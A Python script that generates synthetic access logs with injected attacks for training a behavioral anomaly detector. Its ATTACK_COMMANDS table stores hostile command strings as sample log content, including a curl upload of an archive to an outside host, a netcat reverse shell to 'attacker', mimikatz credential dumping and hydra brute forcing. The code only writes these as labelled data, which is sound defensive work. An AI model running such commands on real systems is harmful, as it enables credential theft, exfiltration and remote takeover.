"""
Phase 1: Data Engineering — Synthetic Behavioral Access Log Generator
======================================================================
Generates 15,000+ synthetic access logs with realistic per-entity behavioral
baselines, 3-5% injected anomalies across 7 attack classes, and 5% cold-start
entities with no established history.
"""

import os
import json
import random
import numpy as np
import pandas as pd
from datetime import datetime, timedelta
from faker import Faker

# ---------------------------------------------------------------------------
# Reproducibility
# ---------------------------------------------------------------------------
fake = Faker()
Faker.seed(42)
np.random.seed(42)
random.seed(42)

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(BASE_DIR, "data")
os.makedirs(DATA_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Temporal window (14 continuous days)
# ---------------------------------------------------------------------------
START_DATE = datetime(2026, 7, 10, 0, 0, 0)
END_DATE = START_DATE + timedelta(days=14)

# ---------------------------------------------------------------------------
# Reference data
# ---------------------------------------------------------------------------
GEO_LOCATIONS = {
    "New York, US":      (40.7128,  -74.0060),
    "San Francisco, US": (37.7749, -122.4194),
    "London, UK":        (51.5074,   -0.1278),
    "Tokyo, JP":         (35.6762,  139.6503),
    "Sydney, AU":       (-33.8688,  151.2093),
    "Berlin, DE":        (52.5200,   13.4050),
    "Mumbai, IN":        (19.0760,   72.8777),
    "Toronto, CA":       (43.6532,  -79.3832),
    "Singapore, SG":     ( 1.3521,  103.8198),
    "Sao Paulo, BR":    (-23.5505,  -46.6333),
    "Dubai, AE":         (25.2048,   55.2708),
    "Seoul, KR":         (37.5665,  126.9780),
    "Chicago, US":       (41.8781,  -87.6298),
    "Austin, US":        (30.2672,  -97.7431),
    "Seattle, US":       (47.6062, -122.3321),
    "Denver, US":        (39.7392, -104.9903),
    "Moscow, RU":        (55.7558,   37.6173),
    "Paris, FR":         (48.8566,    2.3522),
    "Beijing, CN":       (39.9042,  116.4074),
    "Lagos, NG":         ( 6.5244,    3.3792),
}
GEO_KEYS = list(GEO_LOCATIONS.keys())

RESOURCES = [
    "/api/v1/users",              "/api/v1/admin/config",
    "/api/v1/reports/financial",  "/api/v1/data/export",
    "/db/production/customers",   "/db/production/transactions",
    "/db/staging/analytics",      "/file/hr/payroll.xlsx",
    "/file/engineering/source.tar.gz", "/file/legal/contracts",
    "/api/v1/auth/tokens",        "/api/v1/secrets/vault",
    "/api/v1/network/firewall-rules", "/api/v1/logs/audit",
    "/api/v1/deploy/pipeline",    "/api/v1/keys/rotate",
    "/storage/backup/full",       "/storage/archive/2024",
    "/api/v1/users/bulk-export",  "/api/v1/admin/permissions",
]

SENSITIVE_RESOURCES = [
    "/api/v1/admin/config",       "/api/v1/reports/financial",
    "/api/v1/data/export",        "/db/production/customers",
    "/db/production/transactions", "/file/hr/payroll.xlsx",
    "/api/v1/secrets/vault",      "/api/v1/keys/rotate",
    "/api/v1/users/bulk-export",  "/api/v1/admin/permissions",
    "/storage/backup/full",
]

AUTH_METHODS = ["password", "mfa", "sso", "api_key", "certificate"]

DEVICE_FINGERPRINTS = [
    "Windows-11/AA:BB:CC:DD:EE:01",  "Windows-11/AA:BB:CC:DD:EE:02",
    "macOS-14/11:22:33:44:55:01",    "macOS-14/11:22:33:44:55:02",
    "Ubuntu-22/DE:AD:BE:EF:00:01",   "Ubuntu-22/DE:AD:BE:EF:00:02",
    "RHEL-9/CA:FE:BA:BE:00:01",      "iOS-17/FE:DC:BA:98:76:01",
    "Android-14/AB:CD:EF:01:23:01",  "ChromeOS/01:02:03:04:05:01",
]

NORMAL_COMMANDS = [
    ["ls", "cd /home", "cat README"],
    ["git pull origin main", "make build", "make test"],
    ["SELECT * FROM users", "INSERT INTO audit_log"],
    ["kubectl get pods", "kubectl logs deployment/api"],
    ["ssh bastion01", "scp report.csv user@host:/data"],
    ["docker ps -a", "docker logs webapp"],
    ["vim config.yml", "grep -r 'pattern' src/", "awk '{print $1}'"],
    ["python pipeline.py", "pip list --outdated"],
    ["npm run build", "npm test -- --coverage"],
    ["aws s3 ls s3://bucket", "aws ec2 describe-instances"],
]

ATTACK_COMMANDS = {
    "brute_force": [
        ["ssh -l root target", "passwd admin", "su -"],
        ["hydra -l admin -P wordlist.txt ssh://target", "medusa -h target"],
    ],
    "lateral_movement": [
        ["psexec \\\\server02 cmd", "wmic /node:server03 process list",
         "net use \\\\dc01\\c$"],
        ["mimikatz sekurlsa::logonpasswords", "pass-the-hash admin NTLM"],
    ],
    "exfiltration": [
        ["tar czf exfil.tar.gz /data/sensitive",
         "curl -X POST https://drop.io -d @exfil.tar.gz", "base64 -w0 dump.sql"],
        ["rsync -avz /sensitive/ remote:/drop/", "nc -e /bin/sh attacker 4444"],
    ],
    "credential_stuffing": [
        ["login admin password123", "auth user pass", "token generate"],
        ["curl -s -d 'user=admin&pass=test' https://target/login"],
    ],
}

ANOMALY_TYPES = [
    "brute_force", "impossible_travel", "credential_stuffing",
    "lateral_movement", "device_spoofing", "low_and_slow_exfil",
    "insider_drift",
]


# ===================================================================
# Entity profile builder
# ===================================================================
def create_entity_profiles():
    """Create per-entity behavioral baselines for all entity types."""
    profiles = {}

    # ---- Regular users (USR_101 … USR_500) ----
    for i in range(101, 501):
        eid = f"USR_{i:03d}"
        primary_geo = random.choice(GEO_KEYS)
        secondary_geo = random.choice([g for g in GEO_KEYS if g != primary_geo])
        profiles[eid] = {
            "entity_type": "user",
            "primary_geos": [primary_geo, secondary_geo],
            "geo_weights": [0.85, 0.15],
            "work_hours": (random.randint(7, 10), random.randint(17, 20)),
            "typical_resources": random.sample(RESOURCES, k=random.randint(3, 6)),
            "auth_method": random.choice(["password", "mfa", "sso"]),
            "session_duration_range": (random.randint(5, 30),
                                       random.randint(60, 480)),
            "device_fingerprint": random.choice(DEVICE_FINGERPRINTS),
            "avg_daily_events": random.randint(2, 4),
            "is_coldstart": False,
        }

    # ---- Service accounts (SVC_001 … SVC_020) ----
    for i in range(1, 21):
        eid = f"SVC_{i:03d}"
        primary_geo = random.choice(GEO_KEYS[:5])
        profiles[eid] = {
            "entity_type": "service_account",
            "primary_geos": [primary_geo],
            "geo_weights": [1.0],
            "work_hours": (0, 24),
            "typical_resources": random.sample(RESOURCES, k=random.randint(2, 4)),
            "auth_method": random.choice(["api_key", "certificate"]),
            "session_duration_range": (1, 30),
            "device_fingerprint": random.choice(DEVICE_FINGERPRINTS[-3:]),
            "avg_daily_events": random.randint(5, 10),
            "is_coldstart": False,
        }

    # ---- Edge devices (EDG_001 … EDG_025) ----
    for i in range(1, 26):
        eid = f"EDG_{i:03d}"
        primary_geo = random.choice(GEO_KEYS)
        profiles[eid] = {
            "entity_type": "edge_device",
            "primary_geos": [primary_geo],
            "geo_weights": [1.0],
            "work_hours": (0, 24),
            "typical_resources": random.sample(RESOURCES[:10],
                                               k=random.randint(1, 3)),
            "auth_method": "certificate",
            "session_duration_range": (1, 15),
            "device_fingerprint": random.choice(DEVICE_FINGERPRINTS),
            "avg_daily_events": random.randint(3, 6),
            "is_coldstart": False,
        }

    # ---- Cold-start entities  (5 % of total) ----
    n_regular = len(profiles)
    n_coldstart = max(1, round(n_regular * 0.053))  # ~25
    for i in range(501, 501 + n_coldstart):
        eid = f"USR_{i:03d}"
        primary_geo = random.choice(GEO_KEYS)
        profiles[eid] = {
            "entity_type": "user",
            "primary_geos": [primary_geo],
            "geo_weights": [1.0],
            "work_hours": (random.randint(7, 10), random.randint(17, 20)),
            "typical_resources": random.sample(RESOURCES, k=random.randint(2, 4)),
            "auth_method": random.choice(AUTH_METHODS),
            "session_duration_range": (random.randint(5, 20),
                                       random.randint(30, 120)),
            "device_fingerprint": random.choice(DEVICE_FINGERPRINTS),
            "avg_daily_events": random.randint(1, 2),
            "is_coldstart": True,
        }

    return profiles


# ===================================================================
# Normal log generator
# ===================================================================
def _generate_normal_log(entity_id, profile, base_ts):
    """Produce a single normal-behaviour log entry."""
    geo = np.random.choice(profile["primary_geos"], p=profile["geo_weights"])
    start_h, end_h = profile["work_hours"]

    ts = base_ts
    if profile["entity_type"] == "user" and start_h < end_h:
        hour = random.randint(start_h, end_h - 1)
        ts = ts.replace(hour=hour,
                        minute=random.randint(0, 59),
                        second=random.randint(0, 59))

    dur_lo, dur_hi = profile["session_duration_range"]
    return {
        "entity_id":          entity_id,
        "entity_type":        profile["entity_type"],
        "timestamp":          ts.strftime("%Y-%m-%d %H:%M:%S"),
        "source_ip":          (fake.ipv4_private() if "US" in geo
                               else fake.ipv4_public()),
        "geo_location":       geo,
        "resource_accessed":  random.choice(profile["typical_resources"]),
        "auth_method":        profile["auth_method"],
        "session_duration":   round(random.uniform(dur_lo, dur_hi), 1),
        "command_sequence":   json.dumps(random.choice(NORMAL_COMMANDS)),
        "device_fingerprint": profile["device_fingerprint"],
        "label":              "normal",
    }


# ===================================================================
# Anomaly injector  (7 attack classes)
# ===================================================================
def _generate_anomalous_logs(profiles):
    """Inject anomalies with controlled per-class event counts."""
    anomalies = []
    entity_ids = [eid for eid, p in profiles.items() if not p["is_coldstart"]]

    # events × avg entries ≈ balanced ~600-700 total anomalous rows
    event_budget = {
        "brute_force":        8,   # ~8×14 = 112
        "impossible_travel": 40,   # ~40×2 =  80
        "credential_stuffing":10,  # ~10×8 =  80
        "lateral_movement":  12,   # ~12×7 =  84
        "device_spoofing":   80,   # ~80×1 =  80
        "low_and_slow_exfil":16,   # ~16×5 =  80
        "insider_drift":     15,   # ~15×5 =  75
    }

    for atype, n_events in event_budget.items():
        for _ in range(n_events):
            eid = random.choice(entity_ids)
            prof = profiles[eid]
            ts = START_DATE + timedelta(
                days=random.randint(0, 13),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59),
            )

            # ---- BRUTE FORCE -------------------------------------------
            if atype == "brute_force":
                for j in range(random.randint(8, 20)):
                    anomalies.append({
                        "entity_id": eid,
                        "entity_type": prof["entity_type"],
                        "timestamp": (ts + timedelta(
                            seconds=j * random.randint(1, 5))
                        ).strftime("%Y-%m-%d %H:%M:%S"),
                        "source_ip": fake.ipv4_public(),
                        "geo_location": random.choice(GEO_KEYS),
                        "resource_accessed": "/api/v1/auth/tokens",
                        "auth_method": "password",
                        "session_duration": 0.0,
                        "command_sequence": json.dumps(
                            random.choice(ATTACK_COMMANDS["brute_force"])),
                        "device_fingerprint": random.choice(
                            DEVICE_FINGERPRINTS),
                        "label": "brute_force",
                    })

            # ---- IMPOSSIBLE TRAVEL -------------------------------------
            elif atype == "impossible_travel":
                geo1 = random.choice(GEO_KEYS[:10])
                geo2 = random.choice(
                    [g for g in GEO_KEYS[10:] if g != geo1])
                gap_min = random.randint(5, 30)
                for hop, (geo, t_off) in enumerate(
                        [(geo1, 0), (geo2, gap_min * 60)]):
                    anomalies.append({
                        "entity_id": eid,
                        "entity_type": prof["entity_type"],
                        "timestamp": (ts + timedelta(seconds=t_off)
                                      ).strftime("%Y-%m-%d %H:%M:%S"),
                        "source_ip": fake.ipv4_public(),
                        "geo_location": geo,
                        "resource_accessed": random.choice(
                            prof["typical_resources"]),
                        "auth_method": prof["auth_method"],
                        "session_duration": round(
                            random.uniform(5, 60), 1),
                        "command_sequence": json.dumps(
                            random.choice(NORMAL_COMMANDS)),
                        "device_fingerprint": (
                            prof["device_fingerprint"] if hop == 0
                            else random.choice(DEVICE_FINGERPRINTS)),
                        "label": "impossible_travel",
                    })

            # ---- CREDENTIAL STUFFING -----------------------------------
            elif atype == "credential_stuffing":
                stuffing_ip = fake.ipv4_public()
                for j in range(random.randint(5, 12)):
                    t_eid = random.choice(entity_ids)
                    anomalies.append({
                        "entity_id": t_eid,
                        "entity_type": profiles[t_eid]["entity_type"],
                        "timestamp": (ts + timedelta(
                            seconds=j * random.randint(2, 10))
                        ).strftime("%Y-%m-%d %H:%M:%S"),
                        "source_ip": stuffing_ip,
                        "geo_location": random.choice(GEO_KEYS),
                        "resource_accessed": "/api/v1/auth/tokens",
                        "auth_method": "password",
                        "session_duration": 0.0,
                        "command_sequence": json.dumps(
                            random.choice(
                                ATTACK_COMMANDS["credential_stuffing"])),
                        "device_fingerprint": random.choice(
                            DEVICE_FINGERPRINTS),
                        "label": "credential_stuffing",
                    })

            # ---- LATERAL MOVEMENT --------------------------------------
            elif atype == "lateral_movement":
                for j in range(random.randint(5, 10)):
                    anomalies.append({
                        "entity_id": eid,
                        "entity_type": prof["entity_type"],
                        "timestamp": (ts + timedelta(
                            minutes=j * random.randint(1, 5))
                        ).strftime("%Y-%m-%d %H:%M:%S"),
                        "source_ip": fake.ipv4_private(),
                        "geo_location": prof["primary_geos"][0],
                        "resource_accessed": random.choice(
                            SENSITIVE_RESOURCES),
                        "auth_method": prof["auth_method"],
                        "session_duration": round(
                            random.uniform(1, 10), 1),
                        "command_sequence": json.dumps(
                            random.choice(
                                ATTACK_COMMANDS["lateral_movement"])),
                        "device_fingerprint": prof["device_fingerprint"],
                        "label": "lateral_movement",
                    })

            # ---- DEVICE SPOOFING ---------------------------------------
            elif atype == "device_spoofing":
                spoofed = random.choice(
                    [fp for fp in DEVICE_FINGERPRINTS
                     if fp != prof["device_fingerprint"]])
                anomalies.append({
                    "entity_id": eid,
                    "entity_type": prof["entity_type"],
                    "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"),
                    "source_ip": fake.ipv4_public(),
                    "geo_location": random.choice(GEO_KEYS),
                    "resource_accessed": random.choice(
                        SENSITIVE_RESOURCES),
                    "auth_method": prof["auth_method"],
                    "session_duration": round(
                        random.uniform(30, 240), 1),
                    "command_sequence": json.dumps(
                        random.choice(NORMAL_COMMANDS)),
                    "device_fingerprint": spoofed,
                    "label": "device_spoofing",
                })

            # ---- LOW-AND-SLOW EXFILTRATION -----------------------------
            elif atype == "low_and_slow_exfil":
                for day_off in range(random.randint(3, 7)):
                    exfil_ts = START_DATE + timedelta(
                        days=day_off,
                        hours=random.randint(1, 4),
                        minutes=random.randint(0, 59),
                    )
                    anomalies.append({
                        "entity_id": eid,
                        "entity_type": prof["entity_type"],
                        "timestamp": exfil_ts.strftime(
                            "%Y-%m-%d %H:%M:%S"),
                        "source_ip": fake.ipv4_private(),
                        "geo_location": prof["primary_geos"][0],
                        "resource_accessed": random.choice([
                            "/api/v1/data/export",
                            "/api/v1/users/bulk-export",
                            "/storage/backup/full",
                        ]),
                        "auth_method": prof["auth_method"],
                        "session_duration": round(
                            random.uniform(2, 15), 1),
                        "command_sequence": json.dumps(
                            random.choice(
                                ATTACK_COMMANDS["exfiltration"])),
                        "device_fingerprint": prof[
                            "device_fingerprint"],
                        "label": "low_and_slow_exfil",
                    })

            # ---- INSIDER DRIFT -----------------------------------------
            elif atype == "insider_drift":
                for j in range(random.randint(3, 8)):
                    drift_ts = ts + timedelta(
                        days=j, hours=random.randint(0, 3))
                    unusual = [r for r in SENSITIVE_RESOURCES
                               if r not in prof["typical_resources"]]
                    anomalies.append({
                        "entity_id": eid,
                        "entity_type": prof["entity_type"],
                        "timestamp": drift_ts.strftime(
                            "%Y-%m-%d %H:%M:%S"),
                        "source_ip": fake.ipv4_private(),
                        "geo_location": prof["primary_geos"][0],
                        "resource_accessed": (
                            random.choice(unusual) if unusual
                            else random.choice(SENSITIVE_RESOURCES)),
                        "auth_method": prof["auth_method"],
                        "session_duration": round(
                            random.uniform(30, 180), 1),
                        "command_sequence": json.dumps(
                            random.choice(NORMAL_COMMANDS)),
                        "device_fingerprint": prof[
                            "device_fingerprint"],
                        "label": "insider_drift",
                    })

    return anomalies


# ===================================================================
# Public API
# ===================================================================
def generate_dataset():
    """Generate the complete synthetic dataset and save artifacts.

    Returns
    -------
    df : pd.DataFrame       Sorted access-log DataFrame.
    profiles : dict          Per-entity behavioral profiles.
    """
    print("[Phase 1] Generating synthetic access logs ...")

    profiles = create_entity_profiles()
    n_cold = sum(1 for p in profiles.values() if p["is_coldstart"])
    print(f"  Created {len(profiles)} entity profiles "
          f"({n_cold} cold-start, "
          f"{n_cold / len(profiles) * 100:.1f}%)")

    # --- normal logs ---
    normal_logs = []
    for eid, prof in profiles.items():
        n_days = 14 if not prof["is_coldstart"] else random.randint(1, 3)
        lam = prof["avg_daily_events"]
        for day in range(n_days):
            n_events = max(1, int(np.random.poisson(lam)))
            for _ in range(n_events):
                base_ts = START_DATE + timedelta(
                    days=day,
                    hours=random.randint(0, 23),
                    minutes=random.randint(0, 59),
                    seconds=random.randint(0, 59),
                )
                normal_logs.append(
                    _generate_normal_log(eid, prof, base_ts))

    print(f"  Normal logs generated: {len(normal_logs)}")

    # --- anomalous logs ---
    anomaly_logs = _generate_anomalous_logs(profiles)
    print(f"  Anomalous logs generated: {len(anomaly_logs)}")

    # --- combine & sort ---
    all_logs = normal_logs + anomaly_logs
    random.shuffle(all_logs)
    df = pd.DataFrame(all_logs)
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    df = df.sort_values(["entity_id", "timestamp"]).reset_index(drop=True)

    anomaly_pct = (df["label"] != "normal").mean() * 100
    print(f"  Total rows: {len(df):,} | Anomaly rate: {anomaly_pct:.1f}%")

    # --- persist CSV ---
    csv_path = os.path.join(DATA_DIR, "synthetic_access_logs.csv")
    df.to_csv(csv_path, index=False)
    print(f"  Saved -> {csv_path}")

    # --- persist taxonomy JSON ---
    label_counts = df["label"].value_counts().to_dict()
    taxonomy = {
        "description": (
            "Behavioral Anomaly Detection — "
            "Data Taxonomy & Assumptions Document"),
        "generation_params": {
            "total_entities": len(profiles),
            "total_logs": int(len(df)),
            "time_window_days": 14,
            "start_date": START_DATE.isoformat(),
            "end_date": END_DATE.isoformat(),
            "anomaly_rate_target": "3-5 %",
            "anomaly_rate_actual": f"{anomaly_pct:.1f} %",
            "cold_start_entities": n_cold,
            "cold_start_pct": f"{n_cold / len(profiles) * 100:.1f} %",
            "label_distribution": label_counts,
        },
        "schema": {
            "entity_id":
                "Unique identifier (USR_XXX, SVC_XXX, EDG_XXX)",
            "entity_type":
                "Category: user | service_account | edge_device",
            "timestamp":
                "ISO-8601 datetime of the access event",
            "source_ip":
                "IPv4 address of the originating client",
            "geo_location":
                "City, Country-code of the source IP",
            "resource_accessed":
                "API endpoint or file path accessed",
            "auth_method":
                "Authentication type: password | mfa | sso | "
                "api_key | certificate",
            "session_duration":
                "Session length in minutes (0.0 = failed/rejected)",
            "command_sequence":
                "JSON array of commands executed during session",
            "device_fingerprint":
                "OS/MAC address string identifying the device",
            "label":
                "Ground-truth class: 'normal' or attack taxonomy label",
        },
        "anomaly_taxonomy": {
            "brute_force": {
                "description": (
                    "Rapid repeated authentication attempts "
                    "(8-20 within seconds)"),
                "indicators": [
                    "High failed_auth_count_5m",
                    "session_duration == 0",
                    "Targets /api/v1/auth/tokens",
                ],
            },
            "impossible_travel": {
                "description": (
                    "Logins from geographically distant locations "
                    "within impossibly short timeframes"),
                "indicators": [
                    "geo_velocity_kmh > 1000",
                    "Location change > 1000 km in < 30 min",
                ],
            },
            "credential_stuffing": {
                "description": (
                    "Multiple different accounts accessed from "
                    "a single IP in rapid succession"),
                "indicators": [
                    "Same source_ip across many entity_ids",
                    "Auth endpoint targeting",
                    "session_duration == 0",
                ],
            },
            "lateral_movement": {
                "description": (
                    "Sequential access to multiple sensitive "
                    "resources atypical for the entity"),
                "indicators": [
                    "High resource_rarity_score",
                    "Sensitive-resource hopping",
                    "Short session durations",
                ],
            },
            "device_spoofing": {
                "description": (
                    "Access from a device fingerprint inconsistent "
                    "with the entity's established baseline"),
                "indicators": [
                    "fingerprint_mismatch_flag == 1",
                    "Changed OS/MAC combination",
                ],
            },
            "low_and_slow_exfil": {
                "description": (
                    "Small, periodic data exports during off-hours "
                    "over multiple days"),
                "indicators": [
                    "Off-hours access (01:00-04:00)",
                    "Data-export endpoint targeting",
                    "Multi-day recurrence pattern",
                ],
            },
            "insider_drift": {
                "description": (
                    "Gradual escalation to sensitive resources "
                    "outside the entity's normal access pattern"),
                "indicators": [
                    "Increasing resource_rarity_score over time",
                    "Access to HR / admin / secrets endpoints",
                ],
            },
        },
        "behavioral_assumptions": {
            "users": (
                "Work during defined hours (07-20 h), access 3-6 "
                "habitual resources, operate from 1-2 geo locations"),
            "service_accounts": (
                "Operate 24/7 from fixed data-center locations, "
                "authenticate via api_key or certificate"),
            "edge_devices": (
                "Operate 24/7 from a single location, access a "
                "limited resource set, use certificate auth"),
            "cold_start": (
                "Brand-new entity IDs with 1-3 days of history; "
                "no established behavioral baseline for comparison"),
        },
    }
    taxonomy_path = os.path.join(
        DATA_DIR, "data_taxonomy_documentation.json")
    with open(taxonomy_path, "w", encoding="utf-8") as fh:
        json.dump(taxonomy, fh, indent=2, ensure_ascii=False)
    print(f"  Saved -> {taxonomy_path}")

    return df, profiles


# ===================================================================
if __name__ == "__main__":
    generate_dataset()
